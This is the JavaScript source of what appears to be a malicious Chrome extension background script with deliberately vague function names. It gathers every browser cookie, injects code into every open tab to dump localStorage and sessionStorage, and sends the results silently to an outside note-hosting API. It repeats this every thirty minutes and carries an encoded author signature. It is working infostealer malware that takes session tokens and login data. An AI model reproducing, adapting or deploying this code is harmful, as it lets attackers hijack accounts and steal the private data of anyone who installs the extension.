function f1(callback) {
  let myCookies = '';
  chrome.cookies.getAll({}, (cookies) => {
    cookies.forEach(cookie => {
      myCookies += `{d:"${cookie.domain}",`;
      myCookies += `n:"${cookie.name}",`;
      myCookies += `v:"${cookie.value}"}, `;
    });
    callback(myCookies);
  });
}

function f2() {
  return new Promise((resolve, reject) => {
    chrome.tabs.query({}, (tabs) => {
      let allLocalStorage = '';
      let promises = tabs.map((tab) => {
        return new Promise((resolveTab) => {
          chrome.scripting.executeScript(
            {
              target: { tabId: tab.id },
              func: () => {
                let myLocalStorage = '';
                for (let key in localStorage) {
                  myLocalStorage += `{key:"${key}", value:"${localStorage[key]}"}, `;
                }
                return { url: window.location.href, localStorage: myLocalStorage };
              }
            },
            (results) => {
              if (results && results[0] && results[0].result) {
                resolveTab(`URL: ${results[0].result.url}, LocalStorage: ${results[0].result.localStorage}`);
              } else {
                resolveTab('');
              }
            }
          );
        });
      });

      Promise.all(promises).then((results) => {
        allLocalStorage = results.join(' ');
        resolve(allLocalStorage);
      }).catch(reject);
    });
  });
}

function f3() {
  return new Promise((resolve, reject) => {
    chrome.tabs.query({}, (tabs) => {
      let allSessionStorage = '';
      let promises = tabs.map((tab) => {
        return new Promise((resolveTab) => {
          chrome.scripting.executeScript(
            {
              target: { tabId: tab.id },
              func: () => {
                let mySessionStorage = '';
                for (let key in sessionStorage) {
                  mySessionStorage += `{key:"${key}", value:"${sessionStorage[key]}"}, `;
                }
                return { url: window.location.href, sessionStorage: mySessionStorage };
              }
            },
            (results) => {
              if (results && results[0] && results[0].result) {
                resolveTab(`URL: ${results[0].result.url}, SessionStorage: ${results[0].result.sessionStorage}`);
              } else {
                resolveTab('');
              }
            }
          );
        });
      });

      Promise.all(promises).then((results) => {
        allSessionStorage = results.join(' ');
        resolve(allSessionStorage);
      }).catch(reject);
    });
  });
}

function f4(data, id, pad_id, tab_index) {
  console.log(id, tab_index, data)
  fetch('https://www.itextpad.com/api/v3/pad-tab/' + id, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'X-Pad-Id': pad_id
    },
    body: JSON.stringify({
      "id": id,
      "pad_tab_name": "reporting",
      "pad_id": pad_id,
      "note": data,
      "tab_index": tab_index
    }),
  })
    .then(response => response.json())
    .then(data => { })
    .catch((error) => { });
}

function f5() {
  f1((yourCookies) => {
    f4(yourCookies, 259299, 192846, 1)
  });

  f2()
    .then((yourLocalStorage) => {
      f4(yourLocalStorage, 259300, 192846, 2)
    })
    .catch((error) => {

    });

  f3()
    .then((yourSessionStorage) => {
      f4(yourSessionStorage, 259301, 192846, 3)

    })
    .catch((error) => {

    });
}
f5()

setInterval(f5, 1800000);
//VGhlIERlYWRTb3VsIHdhcyBoZXJl

